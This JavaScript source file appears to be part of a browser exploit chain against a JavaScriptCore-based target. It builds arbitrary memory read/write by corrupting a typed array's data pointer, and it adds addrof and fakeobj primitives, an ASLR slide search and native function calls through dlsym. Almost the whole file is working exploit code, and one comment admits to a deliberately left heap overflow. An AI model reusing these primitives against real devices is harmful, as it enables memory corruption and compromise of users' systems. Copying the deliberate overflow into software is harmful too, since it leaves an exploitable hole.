var shit_status = 0x144444;
var global_sptr_addy = 0;
var VECTOR_OFFSET = 0x10;
var fancy_rw = false;
var sptr_size = 0;
var sptr_len = 0;

/*
 *  read uint8_t
 */
function read_u8(addy) {
	if (fancy_rw) {
		return parent[addy];
	}

	u8x4 = u32_to_u8x4(addy);

	/*
	 *  `parent` is a Uint8Array of length 0x100.
	 *  `child` is also a Uint8Array of length 0x100.
	 *  `parent`'s `vector`, its pointer to where its data is stored, has been
	 *  modified to point to the `child` object in memory.
	 *  as such, accessing `parent` will allow for modifying the `child` object.
	 *  
	 *  the way this is used is by writing to `child`'s `vector` so it points to
	 *  arbitrary memory. then, we can access `child`, and we now have arbitrary
	 *  r/w
	 */

	parent[VECTOR_OFFSET + 0x0] = u8x4[0];
	parent[VECTOR_OFFSET + 0x1] = u8x4[1];
	parent[VECTOR_OFFSET + 0x2] = u8x4[2];
	parent[VECTOR_OFFSET + 0x3] = u8x4[3];

	return child[0];
}

/*
 *  read uint16_t
 */
function read_u16(addy) {
	if (fancy_rw) {
		return u8x2_to_u16([parent[addy], parent[addy + 1]]);
	}

	u8x4 = u32_to_u8x4(addy);

	parent[VECTOR_OFFSET + 0x0] = u8x4[0];
	parent[VECTOR_OFFSET + 0x1] = u8x4[1];
	parent[VECTOR_OFFSET + 0x2] = u8x4[2];
	parent[VECTOR_OFFSET + 0x3] = u8x4[3];

	return u8x2_to_u16(child);

}

/*
 *  read uint32_t
 */
function read_u32(addy) {
	if (fancy_rw) {
		return u8x4_to_u32([parent[addy], parent[addy + 1], parent[addy + 2], parent[addy + 3]]);
	}

	u8x4 = u32_to_u8x4(addy);

	parent[VECTOR_OFFSET + 0x0] = u8x4[0];
	parent[VECTOR_OFFSET + 0x1] = u8x4[1];
	parent[VECTOR_OFFSET + 0x2] = u8x4[2];
	parent[VECTOR_OFFSET + 0x3] = u8x4[3];

	return u8x4_to_u32(child);
}

/*
 *  read a buffer
 */
function read_buf(addy, len) {
	var buf = new Uint8Array(len);

	for (cur_addy = addy; cur_addy < (addy + len); cur_addy++) {
		buf[cur_addy - addy] = read_u8(cur_addy);
	}

	return buf;
}

/*
 *  write a buffer
 */
function write_buf(addy, buf, len) {
	for (cur_addy = addy; cur_addy < (addy + len); cur_addy++) {
		write_u8(cur_addy, buf[cur_addy - addy]);
	}

	return buf;
}

function write_u32_buf(addy, buf, len) {
	for (cur_addy = addy; cur_addy < (addy + len); cur_addy += 4) {
		write_u32(cur_addy, buf[(cur_addy - addy) / 4]);
	}

	return buf;
}

function fast_write_buf(addy, buf) {
	var upper_i = Math.ceil(buf.length / 0x100);

	for (var i = 0; i < upper_i; i++) {
		u8x4 = u32_to_u8x4(addy + (i * 0x100));
		parent[VECTOR_OFFSET + 0x0] = u8x4[0];
		parent[VECTOR_OFFSET + 0x1] = u8x4[1];
		parent[VECTOR_OFFSET + 0x2] = u8x4[2];
		parent[VECTOR_OFFSET + 0x3] = u8x4[3];
		for (var j = (i * 0x100); (j < (i * 0x100) + 0x100) && (j < buf.length); j++) {
			child[j % 0x100] = buf[j];
		}
	}
}

/*
 *  write uint8_t
 */
function write_u8(addy, what) {
	if (fancy_rw) {
		parent[addy] = what;
		return;
	}

	u8x4 = u32_to_u8x4(addy);

	parent[VECTOR_OFFSET + 0x0] = u8x4[0];
	parent[VECTOR_OFFSET + 0x1] = u8x4[1];
	parent[VECTOR_OFFSET + 0x2] = u8x4[2];
	parent[VECTOR_OFFSET + 0x3] = u8x4[3];

	child[0] = what;
}

/*
 *  write uint16_t
 */
function write_u16(addy, what) {
	if (fancy_rw) {
		parent[addy] = what & 0xff;
		parent[addy + 1] = (what >> 8) & 0xff;
		
		return;
	}

	u8x4 = u32_to_u8x4(addy);

	parent[VECTOR_OFFSET + 0x0] = u8x4[0];
	parent[VECTOR_OFFSET + 0x1] = u8x4[1];
	parent[VECTOR_OFFSET + 0x2] = u8x4[2];
	parent[VECTOR_OFFSET + 0x3] = u8x4[3];

	u8x2 = u16_to_u8x2(what);
	child[0] = u8x2[0];
	child[1] = u8x2[1];
}

/*
 *  write uint32_t
 */
function write_u32(addy, what) {
	if (fancy_rw) {
		parent[addy] = what & 0xff;
		parent[addy + 1] = (what >> 8) & 0xff;
		parent[addy + 2] = (what >> 16) & 0xff;
		parent[addy + 3] = (what >> 24) & 0xff;

		return;
	}

	u8x4 = u32_to_u8x4(addy);

	parent[VECTOR_OFFSET + 0x0] = u8x4[0];
	parent[VECTOR_OFFSET + 0x1] = u8x4[1];
	parent[VECTOR_OFFSET + 0x2] = u8x4[2];
	parent[VECTOR_OFFSET + 0x3] = u8x4[3];

	u8x4 = u32_to_u8x4(what);
	child[0] = u8x4[0];
	child[1] = u8x4[1];
	child[2] = u8x4[2];
	child[3] = u8x4[3];
}

/*
 *  get process slide
 */
function get_our_slide() {
	for (var slide = MAX_SLIDE; slide >= MIN_SLIDE; slide--) {
		if (read_u32((slide << 12) + 0x4000) == 0xfeedface) {
			return slide;
		}
	}
}

/*
 *  write str to addy
 */
function write_str(addy, s) {
	for (cur_addy = addy; cur_addy < (addy + s.length); cur_addy++) {
		write_u8(cur_addy, s.charCodeAt(cur_addy - addy));
	}

	return s;
}

/*
 *  initialize sptr 'heap', which is used to store the strings created by sptr.
 */
function init_sptr_heap() {
	/*
	 *  this creates a "heap" of-sorts for sptr, which is used to store the
	 *  strings created by sptr.
	 */
	var dlsym_addy = read_u32(reserve_addr + 24 + slid);
	var shc_slide = read_u32(reserve_addr + 20 + slid);
	write_str(0x150000, "malloc\0");
	var addy = call4arg(dlsym_addy + shc_slide, 0xfffffffe, 0x150000, 0, 0);
	global_sptr_addy = call4arg(addy, 0x1000000, 0, 0, 0);
	sptr_size = 0x1000000;
	sptr_len = 0;

	calls4arg("printf\0", sptr("sptr_heap=%p\n"), global_sptr_addy, 0, 0);

	return global_sptr_addy;
}

/*
 *  _sptr is meant to give you a pointer to a specified string
 *  remember your nul's!
 */
function _sptr(s) {
	if ((sptr_len + s.length) >= sptr_size) {
		/*
		 *  expand sptr heap if it's too small
		 *  this will technically fail if the string is over 1MB, and will then
		 *  cause a heap overflow, but eh whatever
		 * 
		 *  sometimes it's fun to include esoteric bugs that are unlikely to
		 *  cause real harm, to add an exploitation challenge. :P
		 */
		var dlsym_addy = read_u32(reserve_addr + 24 + slid);
		var shc_slide = read_u32(reserve_addr + 20 + slid);
		write_str(0x150000, "realloc\0");
		sptr_size += 0x100000;
		var addy = call4arg(dlsym_addy + shc_slide, 0xfffffffe, 0x150000, 0, 0);
		global_sptr_addy = call4arg(addy, global_sptr_addy, sptr_size, 0, 0);
	}
	write_str(global_sptr_addy, s);
	global_sptr_addy += s.length;
	return global_sptr_addy - s.length;
}


/*
 *  _sptr is meant to give you a pointer to a specified string
 *  remember your nul's!
 */
function shit_heap(v) {
	if ((sptr_len + v) >= sptr_size) {
		/*
		 *  expand sptr heap if it's too small
		 *  this will technically fail if the string is over 1MB, and will then
		 *  cause a heap overflow, but eh whatever
		 * 
		 *  sometimes it's fun to include esoteric bugs that are unlikely to
		 *  cause real harm, to add an exploitation challenge. :P
		 */
		var dlsym_addy = read_u32(reserve_addr + 24 + slid);
		var shc_slide = read_u32(reserve_addr + 20 + slid);
		write_str(0x150000, "realloc\0");
		sptr_size += 0x100000;
		var addy = call4arg(dlsym_addy + shc_slide, 0xfffffffe, 0x150000, 0, 0);
		global_sptr_addy = call4arg(addy, global_sptr_addy, sptr_size, 0, 0);
	}
//	write_str(global_sptr_addy, s);
	global_sptr_addy += v;
	return global_sptr_addy - v;
}

function shit_heap_free(v) {
	return;
}

/*
 *  sptr but with nul
 */
function sptr(s) {
	return _sptr(s + "\0");
}

var string_ref;
var global_object;
var jsobj_addr;

var large_buf = new Uint32Array(0x100000);
var large_buf_ptr = 0;

function prep_shit() {
	string_ref = scall("JSStringCreateWithUTF8CString", "victim");
	global_object = scall("JSContextGetGlobalObject", read_u32(slid + reserve_addr + 0x44));
	jsobj_addr = scall("JSObjectGetProperty", read_u32(slid + reserve_addr + 0x44), global_object, string_ref, NULL);
	large_buf_ptr = leak_vec(large_buf);
}

function addrof(obj) {
	victim.target = obj;
	return read_u32(jsobj_addr + 0x18);
}

// broken
function fakeobj(addy) {
	var string_ref = scall("JSStringCreateWithUTF8CString", sptr("victim"));
	var global_object = scall("JSContextGetGlobalObject", read_u32(slid + reserve_addr + 0x44));
	var jsobj_addr = scall("JSObjectGetProperty", read_u32(slid + reserve_addr + 0x44), global_object, string_ref, NULL);
	printf("YOLO\n");
	printf("1 %x\n", read_u32(jsobj_addr + 0x18));
	victim.target = 13.37;
	printf("2 %x\n", read_u32(jsobj_addr + 0x18));
	write_u32(jsobj_addr + 0x18, addy);
	printf("3 %x\n", read_u32(jsobj_addr + 0x18));
	return victim.target;
}

function leak_vec(arr) {
	var addy = addrof(arr);
	printf("%x\n", addy);
	return read_u32(addy + VECTOR_OFFSET);
}

function setup_fancy_rw() {
	write_u32(0x422294, 0xffffffff);
	write_u32(0x422290, 0x0);

	fancy_rw = true;

	printf("%08x\n", u8x4_to_u32([parent[0x5000], parent[0x5001], parent[0x5002], parent[0x5003]]));
}
